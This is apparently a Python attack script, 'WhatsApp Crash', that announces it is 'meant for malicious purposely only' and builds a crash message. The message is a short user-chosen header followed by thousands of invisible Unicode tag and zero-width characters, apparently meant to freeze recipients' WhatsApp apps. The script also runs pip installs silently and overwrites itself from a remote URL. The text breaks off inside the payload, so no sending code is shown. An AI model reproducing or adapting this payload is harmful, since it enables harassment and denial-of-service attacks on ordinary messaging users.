import os
import time as t
import urllib.parse
try:
    import urllib.request
except:
    os.system("pip install urllib2")
try:
    import pyfiglet
except:
    print("Pyfiglet isn't installed 🙁")
    t.sleep(3)
    os.system("pip install pyfiglet")
try:
    import update_check
except:
    os.system("pip install update-check")
try:
    import colorama
except:
    os.system ("pip install colorama")
from colorama import *
colorama.init(autoreset=True)
os.system("clear")
print(Fore.RED + "WhatsApp Crash: This tool is meant for malicious purposely only☠️☠️💀\n\nLet\'s act and stay wicked 😠😠😡🤬\n\nWe don\'t forgive and forget 😈😈\n\nLet us crash WhatsApp 😠😡😡😡")
t.sleep(3)
from update_check import isUpToDate, update
if isUpToDate(__file__,  "https://raw.githubusercontent.com/spider863644/WhatsApp-Crash/main/crash.py") == False:
    print(Fore.RED + "This version is outdated, will update the tool in a minute")
    update("crash.py",  "https://raw.githubusercontent.com/spider863644/WhatsApp-Crash/main/crash.py")
def loop():
    os.system("clear")
    head = pyfiglet.figlet_format("WhatsApp Crash")
    print(Fore.RED + head)
    print(Fore.YELLOW + "Version 1.2".center(70))
    print(Fore.CYAN + "\nThis tool was created by Spider Anongreyhat\n\nFind me on WhatsApp:+2349052863644👨‍💻👨‍💻\n\n\n")
    print(Fore.GREEN + "😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😈😈😈😈😈😈Wickedness Only😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😈😈😈😈😈😡☠️\n\n"
    )
    header = input(Fore.YELLOW + "Enter message header: ")
    if len(header) > 21:
        print(Fore.RED + "Header shouldn\'t be greater than 20 characters[Space included]")
        t.sleep(3)
        loop()
    crash = {'text' : header + """
󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠀬󠀷󠀷󠀷󠁀󠁓󠁗󠀸󠁔󠁅󠁔󠁔󠁎󠁘󠁀󠁀󠁔󠁔󠁔󠁈󠁈󠀸󠀷󠀷󠀷󠀱󠀱󠀱󠀱󠀱󠀹󠀶󠀲󠀶󠀿󠀪󠀭󠀮󠀮󠀼󠀿󠀼󠀼󠁔󠀳󠁔󠀬󠀷󠀷󠀷󠁀󠁓󠁗󠀸󠁔󠁅󠁔󠁔󠁎󠁘󠁀󠁀󠁔󠁔󠁔󠁈󠁈󠀸󠀷󠀷󠀷󠀱󠀱󠀱󠀱󠀱󠀹󠀶󠀲󠀶󠀿󠀪󠀭󠀮󠀮󠀼󠀿󠀼󠀼󠁔󠀳󠁔󠀬󠀷󠀷󠀷󠁀󠁓󠁗󠀸󠁔󠁅󠁔󠁔󠁎󠁘󠁀󠁀󠁔󠁔󠁔󠁈󠁈󠀸󠀷󠀷󠀷󠀱󠀱󠀱󠀱󠀱󠀹󠀶󠀲󠀶󠀿󠀪󠀭󠀮󠀮󠀼󠀿󠀼󠀼󠁔󠀳󠁔󠀬󠀷󠀷󠀷󠁀󠁓󠁗󠀸󠁔󠁅󠁔󠁔󠁎󠁘󠁀󠁀󠁔󠁔󠁔󠁈󠁈󠀸󠀷󠀷󠀷󠀱󠀱󠀱󠀱󠀱󠀹󠀶󠀲󠀶󠀿󠀪󠀭󠀮󠀮󠀼󠀿󠀼󠀼󠁔󠀳󠁔󠀬󠀷󠀷󠀷󠁀󠁓󠁗󠀸󠁔󠁅󠁔󠁔󠁎󠁘󠁀󠁀󠁔󠁔󠁔󠁈󠁈󠀸󠀷󠀷󠀷󠀱󠀱󠀱󠀱󠀱󠀹󠀶󠀲󠀶󠀿󠀪󠀭󠀮󠀮󠀼󠀿󠀼󠀼󠁔‎‏​‌‌󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣